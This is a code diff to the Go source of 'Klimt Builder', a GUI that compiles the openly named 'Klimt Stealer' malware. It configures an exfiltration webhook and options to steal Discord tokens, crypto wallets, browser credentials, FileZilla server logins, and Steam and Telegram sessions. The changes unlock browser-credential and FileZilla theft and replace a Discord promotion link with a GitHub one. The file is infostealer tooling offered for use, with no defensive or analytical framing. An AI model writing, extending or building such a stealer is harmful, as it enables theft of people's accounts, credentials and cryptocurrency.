@@ -22,10 +22,6 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func cleanConfig() {
-	os.WriteFile(config, []byte(""), 0644)
-}
-
 func colorToInt(c color.Color) int {
 	r, g, b, _ := c.RGBA()
 
@@ -40,8 +36,8 @@ func main() {
 	window := app.NewWindow("Klimt Builder - Free Version")
 
 	// Create YHWH Discord hyperlink that open the Discord URL using the default browser
-	discordURL, _ := url.Parse("https://discord.gg/GBjpS3ENGK")
-	discordHyperlink := widget.NewHyperlink("Join the Klimt Stealer Discord Server!", discordURL)
+	githubURL, _ := url.Parse("https://github.com/codeuk/klimt")
+	githubHyperlink := widget.NewHyperlink("Star the Klimt Stealer GitHub repository!", githubURL)
 
 	// Create input boxes
 	webhookInput := widget.NewEntry()
@@ -67,7 +63,6 @@ func main() {
 	getWalletCredentialsCheck := widget.NewCheck("Crypto Wallets", func(bool) {})
 	getBrowserCredentialsCheck := widget.NewCheck("Browser Credentials (Pro)", func(bool) {})
 
-	getBrowserCredentialsCheck.Disable()
 	systemContainer := container.NewVBox(
 		getDiscordTokensCheck,
 		getWalletCredentialsCheck,
@@ -135,7 +130,8 @@ func main() {
 	buildButton := widget.NewButton("Compile Stealer", func() {
 		// Replace the config.go variable lines
 		func() {
-			cleanConfig()
+			// Clean / reset the config file.
+			os.WriteFile(config, []byte(""), 0644)
 
 			webhook := webhookInput.Text
 			hitMessage := hitMessageInput.Text
@@ -218,7 +214,7 @@ func main() {
 
 	// Create a container to hold the input boxes and button
 	content := container.NewVBox(
-		container.NewVBox(discordHyperlink),
+		container.NewVBox(githubHyperlink),
 
 		widget.NewLabel("Webhook"),
 		webhookInput,
@@ -275,7 +271,7 @@ var injectIntoBrowsers = %s // Pro Version
 var getDiscordTokens = %s
 var getWalletCredentials = %s
 var getBrowserCredentials = %s // Pro Version (Free Version only has Password Stealing!)
-var getFileZillaServers = %s // Pro Version
+var getFileZillaServers = %s
 var getSteamSession = %s // Pro Version
 var getTelegramSession = %s // Pro Version
 
